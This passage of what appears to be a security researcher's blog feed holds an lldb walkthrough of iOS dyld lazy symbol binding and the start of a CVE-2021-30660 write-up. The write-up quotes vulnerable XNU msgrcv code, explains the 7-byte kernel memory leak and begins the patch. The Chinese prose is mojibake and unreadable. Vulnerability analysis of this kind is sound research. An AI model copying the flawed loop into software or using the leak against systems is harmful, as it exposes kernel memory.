&#x3D;0x40</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æœ¬è´¨ä¸Šæ˜¯å·®ä¸å¤šçš„ï¼Œå½±å“ä¸å¤§ã€‚</p><p>ä¸‹é¢çœ‹çœ‹æ€ä¹ˆä¸€æ­¥ä¸€æ­¥è°ƒç”¨è¿›å»ï¼Œæ‰¾åˆ°æ‰€éœ€è¦çš„ç¬¦å·</p><h3 id="1-call-dyld-stub-binder"><a href="#1-call-dyld-stub-binder" class="headerlink" title="1.  call dyld_stub_binder"></a>1.  call dyld_stub_binder</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0000000100007f98         ldr        w16, &#x3D;0x6967616d0000001a</span><br><span class="line">0000000100007f9c         b          0x100007f68</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">0000000100007f68         adr        x17, #0x100008028                           ; CODE XREF&#x3D;0x100007f84, 0x100007f90, 0x100007f9c</span><br><span class="line">&#x2F;&#x2F; x17-&gt; _dyld_private</span><br><span class="line"></span><br><span class="line">0000000100007f6c         nop</span><br><span class="line">0000000100007f70         stp        x16, x17, [sp, #-0x10]!</span><br><span class="line"></span><br><span class="line">0000000100007f74         nop</span><br><span class="line">0000000100007f78         ldr        x16, #dyld_stub_binder_100008008</span><br><span class="line"></span><br><span class="line">0000000100007f7c         br         x16 &#x2F;&#x2F; call dyld_stub_binder</span><br></pre></td></tr></table></figure><p>ä¸ªäººçŒœæµ‹ï¼š<code>0x000000000000001a</code> åº”è¯¥æ˜¯ ç±»ä¼¼ linuxä¸‹elf lazy bindingçš„æ—¶å€™é‚£ä¸ªindexå‚æ•°çš„ä¸œè¥¿ï¼Œæ¯ä¸ªç¬¦å·éƒ½ä¸ä¸€æ · ã€‚</p><p>åˆå§‹åŒ–å¥½éœ€è¦çš„å‚æ•°å°±è°ƒç”¨è¿›å»dyldä¸­å»åšç¬¦å·ç»‘å®šæ“ä½œäº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) s</span><br><span class="line">Process 1465 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = 'com.apple.main-thread', stop reason = instruction step into</span></span><br><span class="line">    frame <span class="comment">#0: 0x0000000100fb7f7c main</span></span><br><span class="line">-&gt;  0x100fb7f7c: br     x16</span><br><span class="line">    0x100fb7f80: ldr    w16, 0x100fb7f88</span><br><span class="line">    0x100fb7f84: b      0x100fb7f68</span><br><span class="line">    0x100fb7f88: udf    <span class="comment">#0x0</span></span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 = 0x00000001d858080c  libdyld.dylib`dyld_stub_binder</span><br><span class="line">(lldb) x/10gx <span class="variable">$sp</span></span><br><span class="line">0x16ee4f5a0: 0x000000000000001a 0x0000000100fb8028</span><br><span class="line">0x16ee4f5b0: 0x0000000000001337 0x0000000000000000</span><br><span class="line">0x16ee4f5c0: 0x0000000000000000 0x0000000000000001</span><br><span class="line">0x16ee4f5d0: 0x000000016ee4f5f0 0x00000001d857e8e0</span><br><span class="line">0x16ee4f5e0: 0x00000001d857e8e0 0x0000000000000000</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = 0x0000000100fb7fa4  <span class="string">"magic is : %d\n"</span></span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = 0x0000000000001337</span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = 0x00000000000120a8</span><br></pre></td></tr></table></figure><h3 id="2-call-dyld-fastBindLazySymbol-loadercache-lazyinfo"><a href="#2-call-dyld-fastBindLazySymbol-loadercache-lazyinfo" class="headerlink" title="2. call dyld::fastBindLazySymbol(loadercache, lazyinfo)"></a>2. call dyld::fastBindLazySymbol(loadercache, lazyinfo)</h3><p>ä¿å­˜æ ˆå¸§ï¼Œä¿å­˜å½“å‰çš„å¯„å­˜å™¨ä¿¡æ¯(ä¸€å¤§å †stpæŒ‡ä»¤ï¼Œåé¢ç¬¦å·ç»‘å®šå®Œæˆåï¼Œldpä¼šæ¢å¤ï¼Œè¿™äº›æ˜¯æˆå¯¹çš„)ï¼Œç„¶åè®¾ç½®å¥½å‚æ•°ï¼Œå°±ç›´æ¥è½¬åˆ° <code>dyld::fastBindLazySymbol</code></p><p>ï¼ˆå‡½æ•°å‰é¢çš„ä¿å­˜æ“ä½œçœ‹èµ·æ¥å’Œx86ä¸Šå‡½æ•°å¼€å¤´çš„ä¿å­˜æ ˆå¸§ æŠ¬é«˜æ ˆçµ¦ä¸´æ—¶å˜é‡é¢„ç•™ç©ºé—´çš„æ“ä½œå·®ä¸å¤šï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Process 1465 resuming</span><br><span class="line">Process 1465 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = 'com.apple.main-thread', stop reason = breakpoint 3.1</span></span><br><span class="line">    frame <span class="comment">#0: 0x00000001d8580844 libdyld.dylib`dyld_stub_binder + 56</span></span><br><span class="line">libdyld.dylib`dyld_stub_binder:</span><br><span class="line">-&gt;  0x1d8580844 &lt;+56&gt;: bl     0x1d8581bd4               ; _dyld_fast_stub_entry(void*, long)</span><br><span class="line">    0x1d8580848 &lt;+60&gt;: mov    x16, x0</span><br><span class="line">    0x1d858084c &lt;+64&gt;: ldp    x0, x1, [x29, <span class="comment">#-0x10]</span></span><br><span class="line">    0x1d8580850 &lt;+68&gt;: ldp    x2, x3, [x29, <span class="comment">#-0x20]</span></span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = 0x0000000100fb8028  _dyld_private</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = 0x000000000000001a</span><br></pre></td></tr></table></figure><p>è°ƒç”¨çš„æ˜¯ : <code>fastBindLazySymbol(0x0000000100fb8028, 0x1a)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  LINK_EDIT seg</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> start = fLinkEditBase + fDyldInfo-&gt;lazy_bind_off;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">end</span> = &amp;start[fDyldInfo-&gt;lazy_bind_size];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( ! getLazyBindingInfo(lazyBindingInfoOffset, start, <span class="built_in">end</span>, &amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind) )</span><br><span class="line">            dyld::throwf(<span class="string">"bad lazy bind info"</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span> (!doneAfterBind &amp;&amp; !context.strictMachORequired);</span><br></pre></td></tr></table></figure><p>å¯¹åº”æ±‡ç¼–ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(lldb) c</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> resuming</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 4.1</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5e6c</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">136</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5e6c</span> &lt;+<span class="number">136</span>&gt;: bl     <span class="number">0x100fe1d98</span>               ; ImageLoaderMachO::getLazyBindingInfo(<span class="keyword">unsigned</span> <span class="keyword">int</span>&amp;, <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">unsigned</span> <span class="keyword">char</span>*, <span class="keyword">unsigned</span> <span class="keyword">long</span>*, <span class="keyword">int</span>*, <span class="keyword">char</span> <span class="keyword">const</span>**, <span class="keyword">bool</span>*)</span><br><span class="line">    <span class="number">0x100fe5e70</span> &lt;+<span class="number">140</span>&gt;: tbz    w0, #<span class="number">0x0</span>, <span class="number">0x100fe5f80</span>     ; &lt;+<span class="number">412</span>&gt;</span><br><span class="line">    <span class="number">0x100fe5e74</span> &lt;+<span class="number">144</span>&gt;: ldrb   w1, [sp, #<span class="number">0x43</span>]</span><br><span class="line">    <span class="number">0x100fe5e78</span> &lt;+<span class="number">148</span>&gt;: ldrb   w8, [x20, #<span class="number">0x74</span>]</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = <span class="number">0x0000000100fbc030</span></span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = <span class="number">0x0000000100fbc058</span></span><br><span class="line">(lldb) memory region <span class="number">0x0000000100fbc030</span></span><br><span class="line">[<span class="number">0x0000000100fbc000</span><span class="number">-0x0000000100fc0000</span>) r-- __LINKEDIT</span><br><span class="line"></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨åˆ°äº† æˆ‘è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„LINK_EDIT æ®µå»åšç¬¦å·ç»‘å®šå·¥ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(lldb) <span class="built_in">image</span> lookup -va $x1</span><br><span class="line">      Address: main[<span class="number">0x000000010000c030</span>] (main.__LINKEDIT + <span class="number">48</span>)</span><br><span class="line">      Summary:</span><br><span class="line">       Module: file = <span class="string">"/private/var/tmp/main"</span>, arch = <span class="string">"arm64"</span></span><br></pre></td></tr></table></figure><h3 id="3-ImageLoaderMachO-getLazyBindingInfo"><a href="#3-ImageLoaderMachO-getLazyBindingInfo" class="headerlink" title="3. ImageLoaderMachO::getLazyBindingInfo"></a>3. ImageLoaderMachO::getLazyBindingInfo</h3><p>æ ¹æ®ä¸åŒçš„opcodeï¼Œèµ°ä¸åŒåˆ†æ”¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( lazyBindingInfoOffset &gt; (lazyInfoEnd-lazyInfoStart) )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">bool</span> done = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span>* p = &amp;lazyInfoStart[lazyBindingInfoOffset];</span><br><span class="line">    <span class="keyword">while</span> ( !done &amp;&amp; (p &lt; lazyInfoEnd) ) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> immediate = *p &amp; BIND_IMMEDIATE_MASK;</span><br><span class="line">        <span class="keyword">uint8_t</span> opcode = *p &amp; BIND_OPCODE_MASK;</span><br><span class="line">        ++p;</span><br><span class="line">        <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>è·å–ç›®æ ‡ç¬¦å·ç›¸å…³çš„ä¿¡æ¯ :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;segIndex, &amp;segOffset, &amp;libraryOrdinal, &amp;symbolName, &amp;doneAfterBind</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®è¿™äº›ä¿¡æ¯ï¼Œè·å–è¯¥ç¬¦å·çš„åœ°å€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uintptr_t</span> address = segActualLoadAddress(segIndex) + segOffset;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dyldç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œå®ç°çš„å‡½æ•°æœ‰äº›å·®åˆ«ï¼Œä½†æ˜¯æœ¬è´¨æ˜¯ä¸€æ ·çš„</span></span><br><span class="line">(lldb) n</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5ee4</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">256</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5ee4</span> &lt;+<span class="number">256</span>&gt;: mov    x26, x0</span><br><span class="line">    <span class="number">0x100fe5ee8</span> &lt;+<span class="number">260</span>&gt;: mov    x0, x20</span><br><span class="line">    <span class="number">0x100fe5eec</span> &lt;+<span class="number">264</span>&gt;: bl     <span class="number">0x100fe1fb0</span>               ; ImageLoaderMachO::imageBaseAddress() <span class="keyword">const</span></span><br><span class="line">    <span class="number">0x100fe5ef0</span> &lt;+<span class="number">268</span>&gt;: mov    x1, x0</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = <span class="number">0x00000001d860e14c</span>  libsystem_c.dylib`<span class="built_in">printf</span></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç¬¦å·ç»‘å®šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = bindAt(context, <span class="keyword">this</span>, address, BIND_TYPE_POINTER, symbolName, <span class="number">0</span>, <span class="number">0</span>, libraryOrdinal,<span class="literal">NULL</span>, <span class="string">"lazy "</span>, patcher, <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è°ƒè¯•ï¼š</span></span><br><span class="line">frame #<span class="number">0</span>: <span class="number">0x0000000100fe5f28</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">324</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5f28</span> &lt;+<span class="number">324</span>&gt;: bl     <span class="number">0x100fe0664</span>               ; ImageLoaderMachO::bindLocation(ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">char</span>, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">long</span>, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">char</span> <span class="keyword">const</span>*, <span class="keyword">char</span> <span class="keyword">const</span>*, ImageLoaderMachO::ExtraBindData*, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span><br><span class="line">    <span class="number">0x100fe5f2c</span> &lt;+<span class="number">328</span>&gt;: ldrb   w8, [sp, #<span class="number">0x27</span>]</span><br><span class="line">    <span class="number">0x100fe5f30</span> &lt;+<span class="number">332</span>&gt;: ldrb   w9, [x21, #<span class="number">0x139</span>]</span><br><span class="line">    <span class="number">0x100fe5f34</span> &lt;+<span class="number">336</span>&gt;: orr    w8, w8, w9</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 = <span class="number">0x00000001010235e0</span>  dyld::gLinkContext</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 = <span class="number">0x0000000100000000</span></span><br><span class="line">(lldb) re re x2</span><br><span class="line">      x2 = <span class="number">0x0000000100fb8020</span>  (<span class="keyword">void</span> *)<span class="number">0x0000000100fb7f98</span></span><br><span class="line">(lldb) re re x3</span><br><span class="line">      x3 = <span class="number">0x00000001d860e14c</span>  libsystem_c.dylib`<span class="built_in">printf</span></span><br><span class="line">(lldb) re re x4</span><br><span class="line">      x4 = <span class="number">0x0000000000000001</span></span><br><span class="line">(lldb) re re x5</span><br><span class="line">      x5 = <span class="number">0x0000000100fbc04e</span></span><br><span class="line">(lldb) re re x6</span><br><span class="line">      x6 = <span class="number">0x0000000000000000</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¹‹å:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n</span><br><span class="line"><span class="built_in">Process</span> <span class="number">1465</span> stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100fe5f2c</span> dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol(<span class="keyword">unsigned</span> <span class="keyword">int</span>, ImageLoader::LinkContext <span class="keyword">const</span>&amp;, <span class="keyword">void</span> (*)(), <span class="keyword">void</span> (*)()) + <span class="number">328</span></span><br><span class="line">dyld`ImageLoaderMachOCompressed::doBindFastLazySymbol:</span><br><span class="line">-&gt;  <span class="number">0x100fe5f2c</span> &lt;+<span class="number">328</span>&gt;: ldrb   w8, [sp, #<span class="number">0x27</span>]</span><br><span class="line">    <span class="number">0x100fe5f30</span> &lt;+<span class="number">332</span>&gt;: ldrb   w9, [x21, #<span class="number">0x139</span>]</span><br><span class="line">    <span class="number">0x100fe5f34</span> &lt;+<span class="number">336</span>&gt;: orr    w8, w8, w9</span><br><span class="line">    <span class="number">0x100fe5f38</span> &lt;+<span class="number">340</span>&gt;: cbz    w8, <span class="number">0x100fe5e4c</span>           ; &lt;+<span class="number">104</span>&gt;</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) x/gx <span class="number">0x0000000100fb8020</span></span><br><span class="line"><span class="number">0x100fb8020</span>: <span class="number">0x00000001d860e14c</span></span><br><span class="line">(lldb) <span class="built_in">image</span> lookup -va <span class="number">0x00000001d860e14c</span></span><br><span class="line">      Address: libsystem_c.dylib[<span class="number">0x00000001809a614c</span>] (libsystem_c.dylib.__TEXT.__text + <span class="number">263364</span>)</span><br><span class="line">      Summary: libsystem_c.dylib`<span class="built_in">printf</span></span><br><span class="line">       Module: file = <span class="string">"/Users/muhe/Library/Developer/Xcode/iOS DeviceSupport/12.2 (16E227)/Symbols/usr/lib/system/libsystem_c.dylib"</span>, arch = <span class="string">"arm64"</span></span><br><span class="line">       Symbol: id = &#123;<span class="number">0x00000617</span>&#125;, range = [<span class="number">0x00000001d860e14c</span><span class="number">-0x00000001d860e1a8</span>), name=<span class="string">"printf"</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç¬¦å·åœ°å€å·²ç»è¢«å†™è¿‡å»äº†(0x0000000100fb8020)</p><p>è‡³æ­¤ï¼Œç¬¦å·ç»‘å®šè¿‡ç¨‹å®Œæˆã€‚</p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»-é“¾æ¥ã€è£…è½½å’Œåº“ã€‹</p><p><a href="https://juejin.cn/post/6844903912147795982">https://juejin.cn/post/6844903912147795982</a></p><p><a href="https://juejin.cn/post/6844903922654511112#heading-10">https://juejin.cn/post/6844903922654511112#heading-10</a></p><p><a href="https://bbs.pediy.com/thread-263907.htm">https://bbs.pediy.com/thread-263907.htm</a></p><p><a href="https://iosre.com/t/ios-12-4-killed-9/15633">https://iosre.com/t/ios-12-4-killed-9/15633</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ENV&quot;&gt;&lt;a href=&quot;#ENV&quot; class=&quot;headerlink&quot; title=&quot;ENV&quot;&gt;&lt;/a&gt;ENV&lt;/h1&gt;&lt;p&gt;macos11.4 + iphone6 iOS 12.2&lt;/p&gt;</summary>
    
    
    
    <category term="iOS" scheme="http://o0xmuhe.me/categories/iOS/"/>
    
    
    <category term="RE" scheme="http://o0xmuhe.me/tags/RE/"/>
    
    <category term="iOS" scheme="http://o0xmuhe.me/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>ql query for CVE-2021-30660 XNU Kernel Memory Disclosure</title>
    <link href="http://o0xmuhe.me/2021/07/11/ql-query-for-CVE-2021-30660-XNU-Kernel-Memory-Disclosure/"/>
    <id>http://o0xmuhe.me/2021/07/11/ql-query-for-CVE-2021-30660-XNU-Kernel-Memory-Disclosure/</id>
    <published>2021-07-11T08:22:50.000Z</published>
    <updated>2021-07-11T08:29:13.743Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://alexplaskett.github.io/CVE-2021-30660/">CVE-2021-30660 - XNU Kernel Memory Disclosure</a></p><a id="more"></a><h1 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h1><p><code>msgsz</code> å¯æ§</p><p><code>msginfo.msgssz</code> æ˜¯ 8</p><p>å¦‚æœæ§åˆ¶<code> msgsz</code> ä¸æ˜¯ 8çš„ æ•´æ•°å€ï¼Œæ¯”å¦‚9ï¼Œå°±ä¼šå¯¼è‡´åœ¨ç¬¬äºŒæ¬¡å¾ªç¯çš„æ—¶å€™ leakå‡ºæ¥ 7å­—èŠ‚çš„å†…æ ¸æ•°æ®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">next = msghdr-&gt;msg_spot;</span><br><span class="line">    <span class="keyword">for</span> (len = <span class="number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;</span><br><span class="line">        <span class="keyword">size_t</span> tlen;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* compare input (size_t) value against restrict (int) value */</span></span><br><span class="line">        <span class="keyword">if</span> (msgsz &gt; (<span class="keyword">size_t</span>)msginfo.msgssz) &#123;</span><br><span class="line">            tlen = msginfo.msgssz;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tlen = msgsz;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &lt;= <span class="number">-1</span>) &#123;</span><br><span class="line">            panic(<span class="string">"next too low #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &gt;= msginfo.msgseg) &#123;</span><br><span class="line">            panic(<span class="string">"next out of range #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        SYSV_MSG_SUBSYS_UNLOCK();</span><br><span class="line">        eval = copyout(&amp;msgpool[next * msginfo.msgssz],</span><br><span class="line">            user_msgp, tlen);</span><br><span class="line">        SYSV_MSG_SUBSYS_LOCK();</span><br><span class="line">        <span class="keyword">if</span> (eval != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MSG_DEBUG_OK</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error (%d) copying out message segment\\n"</span>,</span><br><span class="line">                eval);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            msg_freehdr(msghdr);</span><br><span class="line">            wakeup((<span class="keyword">caddr_t</span>)msqptr);</span><br><span class="line">            <span class="keyword">goto</span> msgrcvout;</span><br><span class="line">        &#125;</span><br><span class="line">        user_msgp = user_msgp + tlen;   <span class="comment">/* ptr math */</span></span><br><span class="line">        next = msgmaps[next].next;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (len = <span class="number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;</span><br><span class="line">        <span class="keyword">size_t</span> tlen;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * copy the full segment, or less if we're at the end</span></span><br><span class="line"><span class="comment">         * of the message</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        tlen = MIN(msgsz - len, (<span class="keyword">size_t</span>)msginfo.msgssz);</span><br><span class="line">        <span class="keyword">if</span> (next &lt;= <span class="number">-1</span>) &#123;</span><br><span class="line">            panic(<span class="string">"next too low #3"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (next &gt;= msginfo.msgseg) &#123;</span><br><span class="line">            panic(<span class="string">"next out of range #3"</span>);</span><br><span 